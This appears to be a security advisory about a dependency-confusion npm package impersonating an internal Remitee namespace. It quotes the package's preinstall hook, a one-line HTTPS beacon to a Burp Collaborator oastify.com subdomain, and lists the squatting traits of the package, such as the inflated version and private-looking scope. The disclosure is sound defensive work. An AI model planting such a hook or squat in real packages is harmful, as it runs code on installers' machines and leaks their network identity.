summary: Dependency-confusion package with preinstall beacon to Burp Collaborator infrastructure
details: The package's preinstall lifecycle hook (scripts/preinstall.js) performs an HTTPS GET to a unique subdomain of oastify.com (Burp Collaborator out-of-band callback infrastructure): `require("https").get("https://4fkrmomme4z79tb8yj3g8mexioofc50u.oastify.com/testping")`. The unique subdomain identifies the victim install and leaks the source IP and internal DNS resolver identity to whoever controls that Collaborator instance. Package metadata is consistent with a dependency-confusion attack against an internal Remitee namespace: scope `@remitee-money-transfer` shaped like a private internal org, inflated version `99.99.104` to win semver resolution against any private registry, placeholder description "Manager", and an unrelated author handle "astralis". On `npm install`, this package executes arbitrary code on the installer's machine and confirms reachability into the target's internal network — the canonical fingerprint of a dependency-confusion squat.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
